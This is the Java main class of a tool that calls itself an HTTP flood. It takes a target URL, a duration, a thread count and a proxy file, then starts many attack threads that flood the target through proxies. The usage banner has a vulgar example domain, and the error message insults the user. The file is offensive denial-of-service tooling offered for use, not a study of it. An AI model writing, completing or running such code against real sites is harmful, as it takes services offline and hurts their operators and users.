
import java.io.FileNotFoundException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
     private ProxyManager proxyManager;

    public static void main(String[] args) throws InterruptedException{
                                                                    
        if (args.length != 4){
            System.out.println("          _______  _        _______  _______  _______  _______ \n" +
"|\\     /|(  ____ \\( \\      (  ____ \\(  ___  )(       )(  ____ \\\n" +
"| )   ( || (    \\/| (      | (    \\/| (   ) || () () || (    \\/\n" +
"| | _ | || (__    | |      | |      | |   | || || || || (__    \n" +
"| |( )| ||  __)   | |      | |      | |   | || |(_)| ||  __)   \n" +
"| || || || (      | |      | |      | |   | || |   | || (      \n" +
"| () () || (____/\\| (____/\\| (____/\\| (___) || )   ( || (____/\\\n" +
"(_______)(_______/(_______/(_______/(_______)|/     \\|(_______/\n" +
"                                                                ");
            System.out.println("A basic/simple HTTP-FLOOD made in Java ");
            System.out.println("args : url time threads proxies");
            System.out.println("Example: ");
            System.out.println("java -jar http-flooder.jar http://vagina.company 20 10 proxies.txt");
            System.exit(0);
        }

        String url = args[0];
        int time = Integer.parseInt(args[1]);
        int threads = Integer.parseInt(args[2]);
        String proxy = args[3];
            try {
                ProxyManager proxyManager = new ProxyManager();
            if (proxyManager.loadProxy(proxy)) {
        List<Thread> threadList = new ArrayList<>();
        ExecutorService executorService = Executors.newFixedThreadPool(threads);
        for(int i =0; i < threads; i++){
            Thread.sleep(10);
            threadList.add(new Thread(new Attack(time, url, proxyManager)));
            threadList.get(i).start();
            }
                    
                    
      } else {
                System.out.println(" _______  _______  _______  _______  _______ \n" +
"(  ____ \\(  ____ )(  ____ )(  ___  )(  ____ )\n" +
"| (    \\/| (    )|| (    )|| (   ) || (    )|\n" +
"| (__    | (____)|| (____)|| |   | || (____)|\n" +
"|  __)   |     __)|     __)| |   | ||     __)\n" +
"| (      | (\\ (   | (\\ (   | |   | || (\\ (   \n" +
"| (____/\\| ) \\ \\__| ) \\ \\__| (___) || ) \\ \\__\n" +
"(_______/|/   \\__/|/   \\__/(_______)|/   \\__/\n" +
"                                             ");
        System.out.println("Pendejo revisa tus putos proxies!");
      } 
 
    } catch (FileNotFoundException e) {
      e.printStackTrace();
    } 
        

    }


}
